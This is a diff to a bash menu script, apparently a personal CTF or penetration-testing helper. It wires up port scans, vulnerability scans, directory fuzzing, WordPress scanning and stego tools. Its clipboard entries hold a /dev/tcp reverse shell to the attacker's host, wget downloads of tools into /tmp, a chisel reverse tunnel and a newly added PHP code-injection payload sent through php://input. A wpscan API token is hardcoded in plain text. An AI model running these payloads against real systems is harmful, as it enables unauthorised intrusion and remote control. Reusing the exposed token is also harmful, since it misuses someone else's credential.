@@ -22,7 +22,6 @@ LHOST=10.9.233.39
 CTF_HOST=
 
 EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml
-STATUS_CODE=200,204,301,302,307,401,405 # remove 403
 
 COMMAND_2='Serve tools'
 COMMAND_3='Upload handyman'
@@ -30,7 +29,7 @@ COMMAND_4="Remove entry from /etc/hosts"
 
 COMMAND_e1='rustscan --accessible --ulimit 5000 -a $RHOST -- -Pn -sV -sC | tee -i nmap-scan.txt | highlight "^\d+\/tcp"'
 COMMAND_e2='nmap -Pn -sV -oN nmap-vuln.txt --script vuln $RHOST | highlight "CVE-\d*-\d*"'
-COMMAND_e3='ffuf -v -c -recursion -t 64 -o ffuf.txt -mc=$STATUS_CODE -e $EXTS -w "$W_COMMON" -u http://$RHOST/FUZZ'
+COMMAND_e3='ffuf -v -c -recursion -t 64 -o ffuf.txt -e $EXTS -w "$W_COMMON" -u http://$RHOST/FUZZ'
 COMMAND_e4='whatweb -v $RHOST'
 COMMAND_e5='wpscan --api-token G8ifDn8HmQOCnzEB9Z7i9NkJDX9cGvfmPPbOdxTXNFk -v -o wpscan.txt --url http://$RHOST'
 
@@ -53,6 +52,10 @@ COMMAND_d1='binwalk -e file.jpg'
 COMMAND_d2='steghide extract -sf file.jpg'
 COMMAND_d3='7z x file.zip'
 
+COMMAND_t1='haiti HASH'
+COMMAND_t2='python ~/Tools/wordlistctl/wordlistctl.py search/list -g GROUP'
+COMMAND_t3='python ~/Tools/wordlistctl/wordlistctl.py fetch -d -b ~/Tools/wordlists -l KEYWORD'
+
 LINK_1="http://$RHOST/robots.txt"
 LINK_2="https://gtfobins.github.io/"
 
@@ -64,6 +67,7 @@ CLIP_5="bash -i >& /dev/tcp/$LHOST/4444 0>&1"
 CLIP_6="wget -O /tmp/handyman http://$LHOST:8000/handyman_cp"
 CLIP_7="wget -O /tmp/chisel http://$LHOST:8000/chisel"
 CLIP_8="/tmp/chisel client $LHOST:9999 R:$LHOST:8888:127.0.0.1:[OPEN_PORT]"
+CLIP_9="curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"http://$RHOST/index.php?page=php://input%00\" -k -v"
 
 show_menus() {
   clear
@@ -112,6 +116,12 @@ show_menus() {
   echo -e "  ${YELLOW}d2${NOCOLOR}) $COMMAND_d2"
   echo -e "  ${YELLOW}d3${NOCOLOR}) $COMMAND_d3"
   echo -e ""
+  echo -e "  ${LIGHTGREEN}Tools${NOCOLOR}"
+  echo -e "  -----"
+  echo -e "  ${YELLOW}t1${NOCOLOR}) $COMMAND_t1"
+  echo -e "  ${YELLOW}t2${NOCOLOR}) $COMMAND_t2"
+  echo -e "  ${YELLOW}t3${NOCOLOR}) $COMMAND_t3"
+  echo -e ""
   echo -e "  ${LIGHTGREEN}Links${NOCOLOR}"
   echo -e "  -----"
   echo -e "  ${YELLOW}l1${NOCOLOR}) $LINK_1"
@@ -127,6 +137,7 @@ show_menus() {
   echo -e "  ${YELLOW}c6${NOCOLOR}) $CLIP_6"
   echo -e "  ${YELLOW}c7${NOCOLOR}) $CLIP_7"
   echo -e "  ${YELLOW}c8${NOCOLOR}) $CLIP_8"
+  echo -e "  ${YELLOW}c9${NOCOLOR}) $CLIP_9"
   echo -e ""
   echo -e "  (${YELLOW}o${NOCOLOR})pen. Open split"
   echo -e "  e(${RED}x${NOCOLOR})it. Exit"
@@ -286,6 +297,10 @@ read_options() {
     d2) runV $COMMAND_d2;;
     d3) runV $COMMAND_d3;;
 
+    t1) runV $COMMAND_t1;;
+    t2) runV $COMMAND_t2;;
+    t3) runV $COMMAND_t3;;
+
     l1) openLink $LINK_1;;
     l2) openLink $LINK_2;;
 
@@ -297,6 +312,7 @@ read_options() {
     c6) runC $CLIP_6;;
     c7) runC $CLIP_7;;
     c8) runC $CLIP_8;;
+    c9) runC $CLIP_9;;
 
     o) openSplit;;
     open) openSplit;;
